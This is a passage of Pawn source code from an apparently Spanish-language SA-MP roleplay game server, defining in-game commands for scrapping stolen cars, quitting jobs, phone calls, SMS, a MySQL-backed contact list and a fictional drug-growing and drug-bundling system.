				format(string, sizeof(string), "[Radio] Central: Describen al sospechoso como... (({FF0000}%s{02b1af})).", GetPlayerNameRP(playerid));
				SendClientMessage(i, AguamarinaOscuro, string);
			}
		}
	}
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/desguazar", true) == 0) //Vender un coche al desguace
{
	if(PlayerInfo[playerid][pTrabajo] != 8){SendClientMessage(playerid, Rojo, "* No eres ladrón."); return 1;}
    if(PlayerInfo[playerid][pHabLad] < 90){SendClientMessage(playerid, Rojo, "* Necesitas nivel 4 de ladrón para usar este comando."); return 1;}
    if(PlayerInfo[playerid][pTiempoRobo] > 0)
    {
        format(string, sizeof(string), "* Debes esperar %d minutos para usar este comando.", PlayerInfo[playerid][pTiempoRobo]);
        SendClientMessage(playerid, Rojo, string);
        return 1;
    }
	if(!IsPlayerInAnyVehicle(playerid) || GetPlayerState(playerid) != PLAYER_STATE_DRIVER){SendClientMessage(playerid, Rojo, "* No estás montado en un vehículo como conductor."); return 1;}
	new EsPropietario;
	for(new x=0; x<5; x++)
	{
	    if(CarInfo[GetPlayerVehicleID(playerid)][cLlave] == PlayerInfo[playerid][pLlaveCoche][x])EsPropietario = 1;
	}
    if(EsPropietario != 0){SendClientMessage(playerid, Rojo, "* No puedes desguazar tus propios vehículos."); return 1;}
    
	new carid = GetPlayerVehicleID(playerid);
	if(carid <= MAX_VEHPUBLICO){SendClientMessage(playerid, Rojo, "* No puedes desguazar un vehículo de facción o trabajo."); return 1;}
	if(!IsPlayerInRangeOfPoint(playerid, 8.0, 2272.6394,-2350.2861,13.2669) && !IsPlayerInRangeOfPoint(playerid, 8.0, 2294.3999000,-2447.8000500,0.0000000)){SendClientMessage(playerid, Rojo, "* No estás en el desguace."); return 1;}
	
 	new precio;
	precio = ((CarInfo[carid][cValor]/24));
	GivePlayerMoneyAC(playerid, precio);
	format(string, sizeof(string), "Has vendido el vehículo robado al desguace por %d$.", precio);
	SendClientMessage(playerid, Verde, string);
	PlayerInfo[playerid][pTiempoRobo] = 40;
    PlayerInfo[playerid][pHabLad] ++;
	VehExplotado[carid] = 1;
	CarInfo[carid][cEnDeposito] = 1;
    SetVehicleToRespawn(carid);
    if(IsPlayerInRangeOfPoint(playerid, 8.0, 2294.3999000,-2447.8000500,0.0000000)){SetPlayerPos(playerid, 2285.9480,-2425.2461,3.0000);}
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/dejartrabajo", true) == 0) //Renuncia al trabajo
{
	if(PlayerInfo[playerid][pTrabajo] == 0){SendClientMessage(playerid, Rojo, "* No tienes ningún trabajo."); return 1;}
	if(PlayerInfo[playerid][pContrato] > 0)
	{
	    format(string, sizeof(string), "* No puedes dejar tu trabajo todavía. Debes esperar %d horas.", PlayerInfo[playerid][pContrato]);
	    SendClientMessage(playerid, Rojo, string);
	    return 1;
	}
	new empleo = PlayerInfo[playerid][pTrabajo];
	format(string, sizeof(string), "Has renunciado a tu trabajo de %s.", Jobs[empleo-1][JobNombre]);
	SendClientMessage(playerid, Amarillo, string);
    PlayerInfo[playerid][pTrabajo] = 0;
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/renunciar", true) == 0) //Renuncia al contrato
{
	if(PlayerInfo[playerid][pTaller] != 0)
	{
	    if(PlayerInfo[playerid][pTaller] == PlayerInfo[playerid][pNegocio]){SendClientMessage(playerid, Rojo, "* No puedes renunciar al taller del que eres dueño."); return 1;}
		SendClientMessage(playerid, Amarillo, "Has renunciado a tu contrato como mecánico al taller en el que trabajabas.");
	    PlayerInfo[playerid][pTaller] = 0;
	    return 1;
	}
	else{SendClientMessage(playerid, Amarillo, "No has firmado ningún contrato de trabajo con un negocio.");}
	return 1;
}


//----------COMANDOS TELEFONOS----------//

if(strcmp(cmd, "/llamar", true) == 0) //Llama a alguien
{
	if(PlayerInfo[playerid][pTelefono] == 0){SendClientMessage(playerid, Rojo, "* No tienes un número de teléfono asignado a tu cuenta. Compra uno en una tienda de electrónica."); return 1;}
	if(PlayerInfo[playerid][pManoDer] != 68 && PlayerInfo[playerid][pManoIzq] != 68){SendClientMessage(playerid, Rojo, "* Debes tener un teléfono en una mano."); return 1;}
	if(EnLlamada[playerid] != 0){SendClientMessage(playerid, Rojo, "* Ya estás en una llamada."); return 1;}
	tmp = strtok(cmdtext, idx);
    if(!strlen(tmp))
    {
        SendClientMessage(playerid, Naranja, "* /Llamar [Número]");
        SendClientMessage(playerid, Naranja, "Servicios: Emergencías (911), Pizza (555), Taxi (777), Anuncio (444)");
        return 1;
    }
    new numero = strval(tmp);
    if(numero == 0){SendClientMessage(playerid, Rojo, "* No puedes llamar al número 0."); return 1;}
    if(numero == PlayerInfo[playerid][pTelefono]){SendClientMessage(playerid, Rojo, "* No te puedes llamar a tí mismo."); return 1;}
    
    LlamarTelefono(playerid, numero);
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/contestar", true) == 0) //Contesta al teléfono
{
    if(PlayerInfo[playerid][pTelefono] == 0){SendClientMessage(playerid, Rojo, "* No tienes un número de teléfono asignado a tu cuenta. Compra uno en una tienda de electrónica."); return 1;}
	if(PlayerInfo[playerid][pManoDer] != 68 && PlayerInfo[playerid][pManoIzq] != 68 && PlayerInfo[playerid][pServicioPD] == 0){SendClientMessage(playerid, Rojo, "* Debes tener un teléfono en una mano."); return 1;}
	if(EnLlamada[playerid] != 0){SendClientMessage(playerid, Rojo, "* Ya estás en una llamada."); return 1;}
	if(PlayerInfo[playerid][pFaccion] == 1 && PlayerInfo[playerid][pServicioPD] > 0)
	{
		new oyente = NOEXISTE;
		for(new i; i < MAX_PLAYERS; i++)
		{
			if(EnLlamada[i] == 911)
			{
				oyente = i;
				break;
			}
		}

		if(oyente != NOEXISTE)
		{
			PersonaEnLlamada[playerid] = oyente;
			PersonaEnLlamada[oyente] = playerid;
			SendClientMessage(oyente,  Gris, "Han respondido al teléfono.");
			EnLlamada[playerid] = 2;
			EnLlamada[oyente] = 912;
			format(string, sizeof(string), "* %s contesta su llamada de emergencia.", GetPlayerNameRP(playerid));
			ProxDetector(15.0, playerid, string, Morado,Morado,Morado,Morado,Morado);
		}
		return 1;
	}
	if(PersonaEnLlamada[playerid] > NOEXISTE) //llamada normal
	{
		SendClientMessage(playerid, Naranja, "Has contestado a la llamada. Utiliza '/Colgar' para colgar la llamada.");
		SendClientMessage(PersonaEnLlamada[playerid], Gris, "Han respondido al teléfono. Se te cobrará 10$ por minuto.");
		EnLlamada[playerid] = 2;
		EnLlamada[PersonaEnLlamada[playerid]] = 3;
		KillTimer(ToqueLlamadaTimer[playerid]);
		CostoLlamadaTimer[PersonaEnLlamada[playerid]] = SetTimerEx("LlamadaCoste", 6000, true, "d", PersonaEnLlamada[playerid]);
		return 1;
	}
	SendClientMessage(playerid, Rojo, "* Parece no haber llamadas entrantes.");
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/colgar", true) == 0) //Colgar el teléfono
{
	ColgarTelefono(playerid);
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/sms", true) == 0) //Manda SMS a alguien
{
    if(PlayerInfo[playerid][pTelefono] == 0){SendClientMessage(playerid, Rojo, "* No tienes un número de teléfono asignado a tu cuenta. Compra uno en una tienda de electrónica."); return 1;}
	if(PlayerInfo[playerid][pManoDer] != 68 && PlayerInfo[playerid][pManoIzq] != 68){SendClientMessage(playerid, Rojo, "* Debes tener un teléfono en una mano."); return 1;}
	tmp = strtok(cmdtext, idx);
    if(!strlen(tmp))
    {
        SendClientMessage(playerid, Naranja, "* /SMS [Número] [Texto]");
        return 1;
    }
    new numero = strval(tmp);
    if(numero == PlayerInfo[playerid][pTelefono]){SendClientMessage(playerid, Rojo, "* No te puedes enviar un SMS a tí mismo."); return 1;}

    new tlfencontrado = -1;
    for(new x=0; x<MAX_PLAYERS; x++)
    {
        if(IsPlayerConnected(x) && x != INVALID_PLAYER_ID)
        {
            if(PlayerInfo[x][pTelefono] == numero && PlayerTieneObjeto(x, 68))
            {
                tlfencontrado = x;
                break;
            }
        }
    }
    if(tlfencontrado == -1){SendClientMessage(playerid, Gris, "El número que ha marcado no existe o no está disponible."); return 1;}
    
    new length = strlen(cmdtext);
    while ((idx < length) && (cmdtext[idx] <= ' '))
    {
        idx++;
    }
    new offset = idx;
    new result[MAX_PLAYER_NAME];
    while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
    {
        result[idx - offset] = cmdtext[idx];
        idx++;
    }
    result[idx - offset] = EOS;
    if(!strlen(result))
    {
        SendClientMessage(playerid, Naranja, "* /SMS [Número] [Texto]");
        return 1;
    }
    new string2[250];
    format(string, sizeof(string), "* %s envía un mensaje de texto con su teléfono.", GetPlayerNameRP(playerid));
 	ProxDetector(15.0, playerid, string,Morado,Morado,Morado,Morado,Morado);
    format(string2, sizeof(string2), "SMS enviado al %d: %s", numero, result);
    SendClientMessage(playerid, Amarillo, string2);
    SendClientMessage(playerid, RojoIntenso, "Costo del SMS: 5$.");
    PlayerInfo[playerid][pDineroBanco] -= 5;
    format(string2, sizeof(string2), "SMS recibido del %d: %s", PlayerInfo[playerid][pTelefono], result);
    SendClientMessage(tlfencontrado, Amarillo, string2);
    printf("%s envía a %s un SMS: %s", GetPlayerNameRP(playerid), GetPlayerNameRP(tlfencontrado), string);
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/agenda", true) == 0) //Muestra agenda al jugador
{
    if(PlayerInfo[playerid][pTelefono] == 0){SendClientMessage(playerid, Rojo, "* No tienes un número de teléfono asignado a tu cuenta. Compra uno en una tienda de electrónica."); return 1;}
	if(PlayerInfo[playerid][pManoDer] != 68 && PlayerInfo[playerid][pManoIzq] != 68){SendClientMessage(playerid, Rojo, "* Debes tener un teléfono en una mano."); return 1;}
	new string2[250], dialog[1024];
	format(string2, sizeof(string2), "SELECT Nombre FROM agendas WHERE Nombre = '%s'", PlayerInfo[playerid][pNombre]);
    mysql_query(1, string2);
	mysql_store_result();
	new existe;
	existe = mysql_num_rows();
	mysql_free_result();
	if(existe == 0) //Si no existe en la DB, crearla
	{
	    format(string2,sizeof(string2),"INSERT INTO agendas (Nombre) VALUES ('%s')", PlayerInfo[playerid][pNombre]);
    	mysql_query(1, string2);
	}
	
	new opcion[20];
	opcion = strtok(cmdtext, idx);
	if(!strlen(opcion))
	{
		SendClientMessage(playerid, Naranja, "* /Agenda [Ver | Nuevo | Borrar]");
		return 1;
	}
	if(strcmp(opcion,"ver",true) == 0) //ver agenda
	{
		for(new x=0; x<16; x++)
		{
		    new Numero = AgendaNumero[playerid][x], Contacto[41];
		    format(Contacto, sizeof(Contacto), "%s", AgendaContacto[playerid][x]);
			if(!strlen(Contacto) || strcmp(Contacto,"NULL",true) == 0){format(string, sizeof(string), "\n{FFFFFF}%d: Libre", x+1);}
			else{format(string, sizeof(string), "\n{FFFFFF}%d: %s - %d", x+1, Contacto, Numero);}
			strcat(dialog, string);
		}
		ShowPlayerDialog(playerid, 22, DIALOG_STYLE_LIST, "Agenda", dialog, "Seleccionar", "Cerrar");
		return 1;
	}
	if(strcmp(opcion,"nuevo",true) == 0) //agregar número a la agenda
	{
	    tmp = strtok(cmdtext, idx);
	    if(!strlen(tmp))
	    {
	        SendClientMessage(playerid, Naranja, "* /Agenda Nuevo [#Slot] [Número] [Nombre]");
	        return 1;
	    }
	    new slot = strval(tmp)-1;
	    if(slot < 0 || slot > 15){SendClientMessage(playerid, Rojo, "* El espacio debe estar entre 1 y 16."); return 1;}
     	new Contacto[41];
	    format(Contacto, sizeof(Contacto), "%s", AgendaContacto[playerid][slot]);
	    if(strlen(Contacto) && strcmp(Contacto,"NULL",true) != 0){SendClientMessage(playerid, Rojo, "* Espacio ocupado."); return 1;}
	    
	    tmp = strtok(cmdtext, idx);
	    if(!strlen(tmp))
	    {
	        SendClientMessage(playerid, Naranja, "* /Agenda Nuevo [#Slot] [Número] [Nombre]");
	        return 1;
	    }
	    new numero = strval(tmp);
	    
	    new length = strlen(cmdtext);
	    while ((idx < length) && (cmdtext[idx] <= ' '))
	    {
	        idx++;
	    }
	    new offset = idx;
	    new result[MAX_PLAYER_NAME];
	    while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
	    {
	        result[idx - offset] = cmdtext[idx];
	        idx++;
	    }
	    result[idx - offset] = EOS;
	    if(!strlen(result))
	    {
	        SendClientMessage(playerid, Naranja, "* /Agenda Nuevo [#Slot] [Número] [Nombre]");
	        return 1;
	    }
	    
	    AgendaNumero[playerid][slot] = numero;
	    format(AgendaContacto[playerid][slot], sizeof(result), "%s", result);
	    GuardarAgenda(playerid);
	    format(string, sizeof(string), "Contacto '%s' (%d) agregado a la agenda.", result, numero);
	    SendClientMessage(playerid, Verde, string);
	    return 1;
	}
	if(strcmp(opcion,"borrar",true) == 0) //borrar número de la agenda
	{
	    tmp = strtok(cmdtext, idx);
	    if(!strlen(tmp))
	    {
	        SendClientMessage(playerid, Naranja, "* /Agenda Borrar [#Slot]");
	        return 1;
	    }
	    new slot = strval(tmp)-1;
	    if(slot < 0 || slot > 15){SendClientMessage(playerid, Rojo, "* El espacio debe estar entre 1 y 16."); return 1;}
     	new Contacto[41];
	    format(Contacto, sizeof(Contacto), "%s", AgendaContacto[playerid][slot]);
	    if(!strlen(Contacto) || strcmp(Contacto,"NULL",true) == 0){SendClientMessage(playerid, Rojo, "* Espacio vacío."); return 1;}
	    
	    format(string, sizeof(string), "Contacto '%s' (%d) borrado de la agenda.", Contacto, AgendaNumero[playerid][slot]);
	    SendClientMessage(playerid, Verde, string);
	    
	    AgendaNumero[playerid][slot] = 0;
	    format(AgendaContacto[playerid][slot], 41, "");
	    GuardarAgenda(playerid);
	    return 1;
	}
	else
	{
		SendClientMessage(playerid, Naranja, "* /Agenda [Ver | Nuevo | Borrar]");
	}
	return 1;
}

//----------COMANDOS DROGAS----------//

if(strcmp(cmd, "/plantar", true) == 0) //Plantar semillas de drogas
{
    new opcion[25];
	opcion = strtok(cmdtext, idx);
	if(!strlen(opcion))
	{
		SendClientMessage(playerid, Naranja, "* /Plantar [Opción]");
		SendClientMessage(playerid, Naranja, "Marihuana");
		return 1;
	}
	new Float:pX, Float:pY, Float:pZ, Int, VW;
	if(strcmp(opcion,"marihuana",true) == 0)
	{
	    if(PlayerInfo[playerid][pManoDer] != 85 && PlayerInfo[playerid][pManoIzq] != 85){SendClientMessage(playerid, Rojo, "* No tienes una semilla de marihuana en ninguna mano."); return 1;}
	    //Quita unidad de semilla
		if(PlayerInfo[playerid][pManoDer] == 85){PlayerInfo[playerid][pManoDerCant] --;}
		else if(PlayerInfo[playerid][pManoIzq] == 85){PlayerInfo[playerid][pManoIzqCant] --;}
		//Crea planta
		GetPlayerPos(playerid, pX, pY, pZ);
		VW = GetPlayerVirtualWorld(playerid);
		Int = GetPlayerInterior(playerid);
		CrearPlantacion(playerid, 1, pX, pY, pZ, VW, Int);
		Streamer_Update(playerid);
		return 1;
	}
	return 1;
}

if(strcmp(cmd, "/recogerplanta", true) == 0) //Recoge plantacion
{
	new planta = GetPlayerPlantacion(playerid);
	if(planta == 0){SendClientMessage(playerid, Rojo, "* No se ha detectado ninguna plantación a tu alrededor."); return 1;}
	if(PlantaInfo[planta][plEstado] < 100){SendClientMessage(playerid, Rojo, "* No puedes recoger esta plantación todavía."); return 1;}
	if(PlayerInfo[playerid][pManoIzq] != 0 && PlayerInfo[playerid][pManoDer] != 0){SendClientMessage(playerid, Rojo, "* Tienes ambas manos ocupadas."); return 1;}

	if(PlayerInfo[playerid][pManoDer] == 0)
	{
	    PlayerInfo[playerid][pManoDer] = 86;
	    PlayerInfo[playerid][pManoDerCant] = 1;
	    PonerObjeto(playerid, 1, 86);
	}
	else if(PlayerInfo[playerid][pManoIzq] == 0)
	{
	    PlayerInfo[playerid][pManoIzq] = 86;
	    PlayerInfo[playerid][pManoIzqCant] = 1;
	    PonerObjeto(playerid, 2, 86);
	}
	format(string, sizeof(string), "* %s recoge una planta de marihuana del suelo.", GetPlayerNameRP(playerid));
 	ProxDetector(15.0, playerid, string,Morado,Morado,Morado,Morado,Morado);
	EliminarPlantacion(planta);
	return 1;
}

if(strcmp(cmd, "/eliminarplanta", true) == 0) //Eliminar plantacion
{
	new planta = GetPlayerPlantacion(playerid);
	if(planta == 0){SendClientMessage(playerid, Rojo, "* No se ha detectado ninguna plantación a tu alrededor."); return 1;}
	format(string, sizeof(string), "* %s pisotea una planta de marihuana del suelo.", GetPlayerNameRP(playerid));
 	ProxDetector(15.0, playerid, string,Morado,Morado,Morado,Morado,Morado);
	EliminarPlantacion(planta);
	return 1;
}

if(strcmp(cmd, "/preparar", true) == 0) //Recoge plantacion
{
	if(PreparandoDroga[playerid] != 0){SendClientMessage(playerid, Rojo, "* Ya estás preparando alguna droga."); return 1;}
    new opcion[25];
	opcion = strtok(cmdtext, idx);
	if(!strlen(opcion))
	{
		SendClientMessage(playerid, Naranja, "* /Preparar [Droga]");
		SendClientMessage(playerid, Naranja, "Drogas: Marihuana, Crack");
		return 1;
	}
	if(strcmp(opcion,"marihuana",true) == 0)
	{
	    if(PlayerInfo[playerid][pManoDer] != 86 && PlayerInfo[playerid][pManoIzq] != 86){SendClientMessage(playerid, Rojo, "* No tienes una planta de marihuana en ninguna mano."); return 1;}
	    format(string, sizeof(string), "* %s comienza a preparar gramos de marihuana a partir de su planta.", GetPlayerNameRP(playerid));
 		ProxDetector(15.0, playerid, string,Morado,Morado,Morado,Morado,Morado);
 		PreparandoDroga[playerid] = 1;
		TogglePlayerControllable(playerid, 0);
		SetTimerEx("Descongelar", 15000, false, "d", playerid);
		SetTimerEx("PrepararDroga", 15000, false, "d, d", playerid, 1);
	    return 1;
	}
	if(strcmp(opcion,"crack",true) == 0)
	{
		if(PlayerInfo[playerid][pManoDer] != 81 && PlayerInfo[playerid][pManoIzq] != 81){SendClientMessage(playerid, Rojo, "* No tienes una bolsita de cocaina en ninguna mano."); return 1;}
		if(!GetPlayerDentroCasa(playerid) && !GetPlayerDentroNego(playerid)){SendClientMessage(playerid, Rojo, "* No estás en una casa o local."); return 1;}
		if(GetPlayerDentroCasa(playerid) && PlayerInfo[playerid][pCasa] != GetPlayerDentroCasa(playerid) && PlayerInfo[playerid][pCasaAlq] != GetPlayerDentroCasa(playerid)){SendClientMessage(playerid, Rojo, "* No resides en esta vivienda."); return 1;}
		if(GetPlayerDentroNego(playerid) && PlayerInfo[playerid][pNegocio] != GetPlayerDentroNego(playerid)){SendClientMessage(playerid, Rojo, "* No eres el propietario de este local."); return 1;}
	    format(string, sizeof(string), "* %s comienza a preparar gramos de crack a partir de gramos de cocaina y otros productos.", GetPlayerNameRP(playerid));
 		ProxDetector(15.0, playerid, string,Morado,Morado,Morado,Morado,Morado);
 		PreparandoDroga[playerid] = 2;
		TogglePlayerControllable(playerid, 0);
		SetTimerEx("Descongelar", 25000, false, "d", playerid);
		SetTimerEx("PrepararDroga", 25000, false, "d, d", playerid, 2);
		return 1;
	}
	return 1;
}

if(strcmp(cmd, "/fardo", true) == 0) //Comando para fardos
{
    new opcion[25];
	opcion = strtok(cmdtext, idx);
	if(!strlen(opcion))
	{
		SendClientMessage(playerid, Naranja, "* /Fardo [Opción] ");
		SendClientMessage(playerid, Naranja, "Crear, Sacar, Meter, Unir");
		return 1;
	}
	if(strcmp(opcion,"crear",true) == 0)
	{
	    if(GetPlayerBolsitaDroga(playerid, 1)) //Tiene una bolsita de droga en la mano derecha
	    {
	        new fardo;
	        switch(GetPlayerBolsitaDroga(playerid, 1))
	        {
	            case 1: fardo = 75; //Marihuana
	            case 2: fardo = 76; //Cocaína
	            case 3: fardo = 77; //Crack
	            case 4: fardo = 78; //Heroína
	            case 5: fardo = 79; //LSD
	        }
	        PlayerInfo[playerid][pManoDer] = fardo;
	        PonerObjeto(playerid, 1, fardo);
			format(string, sizeof(string), "* Has creado un {fce80c}%s (%d){FFFFFF} en tu mano derecha.", ObjetoInfo[fardo][NombreObjeto], PlayerInfo[playerid][pManoDerCant]);
			SendClientMessage(playerid, Blanco, string);
			format(string, sizeof(string), "* %s crea un fardo de droga.", GetPlayerNameRP(playerid));
 			ProxDetector(15.0, playerid, string,Morado,Morado,Morado,Morado,Morado);
			return 1;
	    }
	    else if(GetPlayerBolsitaDroga(playerid, 2)) //Tiene una bolsita de droga en la mano izquierda
	    {
	        new fardo;
	        switch(GetPlayerBolsitaDroga(playerid, 2))
	        {
	            case 1: fardo = 75; //Marihuana
	            case 2: fardo = 76; //Cocaína
	            case 3: fardo = 77; //Crack
	            case 4: fardo = 78; //Heroína
	            case 5: fardo = 79; //LSD
	        }
	        PlayerInfo[playerid][pManoIzq] = fardo;
	        PonerObjeto(playerid, 2, fardo);
			format(string, sizeof(string), "* Has creado un {fce80c}%s (%d){FFFFFF} en tu mano izquierda.", ObjetoInfo[fardo][NombreObjeto], PlayerInfo[playerid][pManoIzqCant]);
			SendClientMessage(playerid, Blanco, string);
			format(string, sizeof(string), "* %s crea un fardo de droga.", GetPlayerNameRP(playerid));
 			ProxDetector(15.0, playerid, string,Morado,Morado,Morado,Morado,Morado);
			return 1;
	    }
	    else{SendClientMessage(playerid, Rojo, "* No tienes una bolsita de droga en ninguna mano."); return 1;}
	}
	if(strcmp(opcion,"sacar",true) == 0)
	{
	    if(GetPlayerFardoDroga(playerid, 1) && PlayerInfo[playerid][pManoIzq] == 0) //Tiene fardo en mano derecha y mano izquierda libre
		{
		    tmp = strtok(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, Naranja, "* /Fardo Sacar [Cantidad]");
				return 1;
			}
			new cantidad = strval(tmp);
			if(cantidad < 1 || cantidad > 5){SendClientMessage(playerid, Rojo, "* La cantidad debe estar entre 1 y 5."); return 1;}
			if(cantidad > PlayerInfo[playerid][pManoDerCant]){SendClientMessage(playerid, Rojo, "* No hay tanta cantidad en el fardo."); return 1;}
			new bolsita;
	        switch(GetPlayerFardoDroga(playerid, 1))
	        {
	            case 1: bolsita = 80; //Marihuana
	            case 2: bolsita = 81; //Cocaína
	            case 3: bolsita = 82; //Crack
	            case 4: bolsita = 83; //Heroína
	            case 5: bolsita = 84; //LSD
	        }
	        PlayerInfo[playerid][pManoDerCant] -= cantidad;
			PlayerInfo[playerid][pManoIzq] = bolsita, PlayerInfo[playerid][pManoIzqCant] = cantidad;
	        PonerObjeto(playerid, 2, bolsita);
	        format(string, sizeof(string), "* Sacas una {fce80c}%s (%d){FFFFFF} del fardo.", ObjetoInfo[bolsita][NombreObjeto], cantidad);
			SendClientMessage(playerid, Blanco, string);
	        return 1;
		}
		else if(GetPlayerFardoDroga(playerid, 2) && PlayerInfo[playerid][pManoDer] == 0) //Tiene fardo en mano izquierda y mano derecha libre
		{
		    tmp = strtok(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, Naranja, "* /Fardo Sacar [Cantidad]");
				return 1;
			}
			new cantidad = strval(tmp);
			if(cantidad < 1 || cantidad > 5){SendClientMessage(playerid, Rojo, "* La cantidad debe estar entre 1 y 5."); return 1;}
            if(cantidad > PlayerInfo[playerid][pManoIzqCant]){SendClientMessage(playerid, Rojo, "* No hay tanta cantidad en el fardo."); return 1;}
			new bolsita;
	        switch(GetPlayerFardoDroga(playerid, 2))
	        {
	            case 1: bolsita = 80; //Marihuana
	            case 2: bolsita = 81; //Cocaína
	            case 3: bolsita = 82; //Crack
	            case 4: bolsita = 83; //Heroína
	            case 5: bolsita = 84; //LSD
	        }
	        PlayerInfo[playerid][pManoIzqCant] -= cantidad;
			PlayerInfo[playerid][pManoDer] = bolsita, PlayerInfo[playerid][pManoDerCant] = cantidad;
	        PonerObjeto(playerid, 1, bolsita);
	        format(string, sizeof(string), "* Sacas una {fce80c}%s (%d){FFFFFF} del fardo.", ObjetoInfo[bolsita][NombreObjeto], cantidad);
			SendClientMessage(playerid, Blanco, string);
	        return 1;
		}
		else{SendClientMessage(playerid, Rojo, "* Debes tener un fardo en una mano y la otra mano vacía."); return 1;}
	}
	if(strcmp(opcion,"meter",true) == 0)
	{
	    if(!GetPlayerFardoDroga(playerid, 1) && !GetPlayerFardoDroga(playerid, 2)){SendClientMessage(playerid, Rojo, "* No tienes un fardo de droga en ninguna mano."); return 1;}
	    if(!GetPlayerBolsitaDroga(playerid, 1) && !GetPlayerBolsitaDroga(playerid, 2)){SendClientMessage(playerid, Rojo, "* No tienes una bolsita de droga en ninguna mano."); return 1;}
     	if(GetPlayerFardoDroga(playerid, 1) && GetPlayerBolsitaDroga(playerid, 2) && GetPlayerFardoDroga(playerid, 1) == GetPlayerBolsitaDroga(playerid, 2)) //Tiene fardo en mano derecha de misma droga que en mano izquierda
	    {
	        tmp = strtok(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, Naranja, "* /Fardo Meter [Cantidad]");
				return 1;
			}
			new cantidad = strval(tmp);
			if(cantidad < 1 || cantidad > 5){SendClientMessage(playerid, Rojo, "* La cantidad debe estar entre 1 y 5."); return 1;}
			if(cantidad > PlayerInfo[playerid][pManoIzqCant]){SendClientMessage(playerid, Rojo, "* No tienes tanta cantidad de droga en la bolsita."); return 1;}
			if(PlayerInfo[playerid][pManoDerCant] + cantidad > 70){SendClientMessage(playerid, Rojo, "* Los fardos solo pueden llegar a contener 70 gramos."); return 1;}
			PlayerInfo[playerid][pManoDerCant] += cantidad;
			PlayerInfo[playerid][pManoIzqCant] -= cantidad;
			format(string, sizeof(string), "* Metes %d gramos de tu {fce80c}%s {FFFFFF}en el fardo.", cantidad, ObjetoInfo[PlayerInfo[playerid][pManoIzq]][NombreObjeto]);
			SendClientMessage(playerid, Blanco, string);
			return 1;
	    }
	    else if(GetPlayerFardoDroga(playerid, 2) && GetPlayerBolsitaDroga(playerid, 1) && GetPlayerFardoDroga(playerid, 2) == GetPlayerBolsitaDroga(playerid, 1)) //Tiene fardo en mano izquierda de misma droga que en mano derecha
	    {
	        tmp = strtok(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, Naranja, "* /Fardo Meter [Cantidad]");
				return 1;
			}
			new cantidad = strval(tmp);
			if(cantidad < 1 || cantidad > 5){SendClientMessage(playerid, Rojo, "* La cantidad debe estar entre 1 y 5."); return 1;}
			if(cantidad > PlayerInfo[playerid][pManoDerCant]){SendClientMessage(playerid, Rojo, "* No tienes tanta cantidad de droga en la bolsita."); return 1;}
			if(PlayerInfo[playerid][pManoIzqCant] + cantidad > 70){SendClientMessage(playerid, Rojo, "* Los fardos solo pueden llegar a contener 70 gramos."); return 1;}
			PlayerInfo[playerid][pManoIzqCant] += cantidad;
			PlayerInfo[playerid][pManoDerCant] -= cantidad;
			format(string, sizeof(string), "* Metes %d gramos de tu {fce80c}%s {FFFFFF}en el fardo.", cantidad, ObjetoInfo[PlayerInfo[playerid][pManoDer]][NombreObjeto]);
			SendClientMessage(playerid, Blanco, string);
			return 1;
	    }
	    else{SendClientMessage(playerid, Rojo, "* Debes un fardo en una mano y una bolsita en la otra de la misma droga."); return 1;}
	}
	if(strcmp(opcion,"unir",true) == 0)
	{
		if(!GetPlayerFardoDroga(playerid, 1) || !GetPlayerFardoDroga(playerid, 2)){SendClientMessage(playerid, Rojo, "* Debes tener un fardo de droga en cada mano."); return 1;}
		if(GetPlayerFardoDroga(playerid, 1) != GetPlayerFardoDroga(playerid, 2)){SendClientMessage(playerid, Rojo, "* Los fardos no son de la misma droga."); return 1;}
		if(PlayerInfo[playerid][pManoDerCant] >= 70 || PlayerInfo[playerid][pManoIzqCant] >= 70){SendClientMessage(playerid, Rojo, "* Los fardos solo pueden llegar a contener 70 gramos."); return 1;}
		if(PlayerInfo[playerid][pManoDerCant] + PlayerInfo[playerid][pManoIzqCant] <= 70)
		{
		    PlayerInfo[playerid][pManoDerCant] += PlayerInfo[playerid][pManoIzqCant];
		    PlayerInfo[playerid][pManoIzqCant] = 0;
		    format(string, sizeof(string), "* Has unido tus fardos y has obtenido un {fce80c}%s {FFFFFF}de %d gramos.", ObjetoInfo[PlayerInfo[playerid][pManoDer]][NombreObjeto], PlayerInfo[playerid][pManoDerCant]);
			SendClientMessage(playerid, Blanco, string);
			return 1;
		}
		else
		{
		    new cantidad = 70 - PlayerInfo[playerid][pManoDerCant];
		    PlayerInfo[playerid][pManoDerCant] = 70;
		    PlayerInfo[playerid][pManoIzqCant] -= cantidad;
		    format(string, sizeof(string), "* Pasas %d gramos de un {fce80c}%s {FFFFFF}a otro.", cantidad, ObjetoInfo[PlayerInfo[playerid][pManoDer]][NombreObjeto]);
			SendClientMessage(playerid, Blanco, string);
		}
		return 1;
	}
	return 1;
}

if(strcmp(cmd, "/consumir", true) == 0) //Consumir drogas
{
    new opcion[25];
	opcion = strtok(cmdtext, idx);
	if(!strlen(opcion))
	{
		SendClientMessage(playerid, Naranja, "* /Consumir [Droga]");
		SendClientMessage(playerid, Naranja, "Drogas: Marihuana, Cocaina, Crack, Heroina, LSD");
		return 1;
	}
	if(strcmp(opcion,"marihuana",true) == 0)
	{
	    if(PlayerInfo[playerid][pManoDer] != 80 && PlayerInfo[playerid][pManoIzq] != 80){SendClientMessage(playerid, Rojo, "* No tienes una bolsita de marihuana en ninguna mano."); return 1;}
		if(PlayerInfo[playerid][pManoDer] != 69 && PlayerInfo[playerid][pManoIzq] != 69){SendClientMessage(playerid, Rojo, "* Necesitas un mechero con gas para encender el porro."); return 1;}
